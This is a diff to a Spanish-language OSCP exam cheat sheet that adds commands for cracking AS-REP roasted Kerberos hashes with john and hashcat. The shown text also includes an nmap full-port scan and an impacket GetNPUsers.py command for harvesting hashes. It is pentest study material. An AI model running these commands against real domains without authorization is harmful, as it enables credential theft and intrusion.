@@ -3,7 +3,7 @@
 ![banner_oscp](https://user-images.githubusercontent.com/87484792/177843931-081eca92-24f1-4743-a632-48ee65b2ba4a.png)
 
 # Enumeración - Fase Inicial
-## (Enumeración de puertos)
+## Enumeración de puertos
 
 `sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt <ip>` # Encontrar puertos con nmap </br>
 
@@ -211,3 +211,11 @@ Ahora el proceso es muy similar para obtener las columnas y los datos de las col
 *El ataque ASREPRoast busca usuarios sin el atributo requerido de autenticación previa de Kerberos (DONT_REQ_PREAUTH)*
 
 `python3 GetNPUsers.py domain.htb/ -usersfile usernames.txt -outputfile hashes.asreproast` # Buscamos usuarios con un diccionario, si el usuario no necesita pre-autenticación, nos aparecerá su hash. *(Intentaremos crackearlo offline)*.
+
+*Cracking the hash*
+
+`
+john --wordlist=rockyou.txt hashes.asreproast
+hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
+`
+
